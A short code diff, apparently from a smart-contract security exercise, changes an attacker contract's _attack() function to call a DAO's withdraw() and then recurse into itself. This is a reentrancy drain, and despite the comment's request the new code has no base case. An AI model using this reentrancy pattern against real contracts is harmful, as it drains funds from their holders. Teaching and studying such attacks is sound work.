@@ -18,12 +18,8 @@ def _attack() -> bool:
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
 
-    is_attack:bool = True
-
-    if is_attack:
-        is_attack = False
-        if DAO(self.dao_address).withdraw():
-            pass
+    if DAO(self.dao_address).withdraw():
+        self._attack()
 
     return True
 
